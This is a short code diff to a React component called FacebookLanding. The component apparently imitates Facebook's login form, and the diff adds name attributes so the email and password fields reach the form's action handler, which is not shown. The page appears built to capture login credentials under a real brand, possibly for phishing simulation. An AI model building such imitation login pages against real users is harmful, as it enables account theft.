@@ -21,8 +21,18 @@ export function FacebookLanding({
         <Card className="mx-auto w-[400px]">
           <CardContent className="pt-6">
             <form className="space-y-4" action={action}>
-              <Input placeholder="Email or phone number" type="text" required />
-              <Input placeholder="Password" type="password" required />
+              <Input
+                placeholder="Email or phone number"
+                type="text"
+                required
+                name="email"
+              />
+              <Input
+                placeholder="Password"
+                type="password"
+                required
+                name="password"
+              />
               <Button
                 className="w-full bg-[#1877f2] hover:bg-[#1877f2]/70 text-white"
                 type="submit"
